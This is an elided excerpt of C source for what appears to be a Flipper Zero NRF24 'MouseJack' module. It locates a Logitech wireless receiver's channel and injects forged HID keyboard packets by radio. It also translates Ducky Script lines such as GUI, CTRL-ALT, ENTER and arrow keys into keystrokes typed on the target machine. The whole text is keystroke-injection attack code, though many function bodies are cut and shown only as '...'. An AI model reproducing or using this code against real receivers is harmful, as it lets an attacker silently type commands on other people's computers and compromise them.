...
static void inject_packet(FuriHalSpiBusHandle* handle, uint8_t* addr, uint8_t addr_size, uint8_t rate, uint8_t* payload, size_t payload_size)
{
    uint8_t rt_count = 0;
    while(1)
    {
        ...
        {
            if(nrf24_find_channel(handle, addr, addr, addr_size, rate, LOGITECH_MIN_CHANNEL, LOGITECH_MAX_CHANNEL, true) > LOGITECH_MAX_CHANNEL)
            	return; // fail
...
static void send_hid_packet(FuriHalSpiBusHandle* handle, uint8_t* addr, uint8_t addr_size, uint8_t rate, uint8_t mod, uint8_t hid)
{
	uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};
	build_hid_packet(0, 0, hid_payload);
	if(hid == prev_hid)
		inject_packet(handle, addr, addr_size, rate, hid_payload, LOGITECH_HID_TEMPLATE_SIZE); // empty hid packet
...
static bool mj_process_ducky_line(FuriHalSpiBusHandle* handle, uint8_t* addr, uint8_t addr_size, uint8_t rate, char* line, char* prev_line) {
	MJDuckyKey dk;
	uint8_t hid_payload[LOGITECH_HID_TEMPLATE_SIZE] = {0};
	char* line_tmp = line;
    ...
    if(strncmp(line_tmp, ducky_cmd_comment, strlen(ducky_cmd_comment)) == 0) {
        ...
        {
        	if(!mj_get_ducky_key(&line_tmp[i], 1, &dk))
        		return false;
    	...
    	line_tmp = &line_tmp[mj_ducky_get_command_len(line_tmp) + 1];
    	if(!mj_get_ducky_key(line_tmp, strlen(line_tmp), &dk))
        	return false;
        send_hid_packet(handle, addr, addr_size, rate, dk.mod | 4, dk.hid);
        return true;
    } else if(strncmp(line_tmp, "GUI", strlen("GUI")) == 0 ||
    	...
    	return true;
    } else if(strncmp(line_tmp, "CTRL-ALT", strlen("CTRL-ALT")) == 0 ||
    	...
    	return true;
    } else if(strncmp(line_tmp, "CTRL-SHIFT", strlen("CTRL-SHIFT")) == 0 ||
    	...
    	return true;
    } else if(strncmp(line_tmp, "CTRL", strlen("CTRL")) == 0 ||
    	...
    	return true;
    } else if(strncmp(line_tmp, "ESC", strlen("ESC")) == 0 ||
    		  strncmp(line_tmp, "APP", strlen("APP")) == 0 ||
    		  strncmp(line_tmp, "ESCAPE", strlen("ESCAPE")) == 0){
    	if(!mj_get_ducky_key("ESCAPE", 6, &dk))
        	return false;
        send_hid_packet(handle, addr, addr_size, rate, dk.mod, dk.hid);
    	return true;
    } else if(strncmp(line_tmp, "ENTER", strlen("ENTER")) == 0){
    	if(!mj_get_ducky_key("ENTER", 5, &dk))
        	return false;
        send_hid_packet(handle, addr, addr_size, rate, dk.mod, dk.hid);
    	return true;
    } else if(strncmp(line_tmp, "UP", strlen("UP")) == 0 ||
    		  strncmp(line_tmp, "UPARROW", strlen("UPARROW")) == 0){
    	if(!mj_get_ducky_key("UP", 2, &dk))
        	return false;
        send_hid_packet(handle, addr, addr_size, rate, dk.mod, dk.hid);
    	return true;
    } else if(strncmp(line_tmp, "DOWN", strlen("DOWN")) == 0 ||
    		  strncmp(line_tmp, "DOWNARROW", strlen("DOWNARROW")) == 0){
    	if(!mj_get_ducky_key("DOWN", 4, &dk))
        	return false;
        send_hid_packet(handle, addr, addr_size, rate, dk.mod, dk.hid);
    	return true;
    } else if(strncmp(line_tmp, "LEFT", strlen("LEFT")) == 0 ||
    		  strncmp(line_tmp, "LEFTARROW", strlen("LEFTARROW")) == 0){
    	if(!mj_get_ducky_key("LEFT", 4, &dk))
        	return false;
        send_hid_packet(handle, addr, addr_size, rate, dk.mod, dk.hid);
    	return true;
    } else if(strncmp(line_tmp, "RIGHT", strlen("RIGHT")) == 0 ||
    		  strncmp(line_tmp, "RIGHTARROW", strlen("RIGHTARROW")) == 0){
    	if(!mj_get_ducky_key("RIGHT", 5, &dk))
        	return false;
        send_hid_packet(handle, addr, addr_size, rate, dk.mod, dk.hid);
    	return true;
    } else if(strncmp(line_tmp, "SPACE", strlen("SPACE")) == 0){
    	if(!mj_get_ducky_key("SPACE", 5, &dk))
        	return false;
        send_hid_packet(handle, addr, addr_size, rate, dk.mod, dk.hid);
    	return true;
    }
...
void mj_process_ducky_script(FuriHalSpiBusHandle* handle, uint8_t* addr, uint8_t addr_size, uint8_t rate, char *script)
{
    ...
    build_hid_packet(0, 0, hid_payload);
	inject_packet(handle, addr, addr_size, rate, hid_payload, LOGITECH_HID_TEMPLATE_SIZE); // empty hid packet at end
}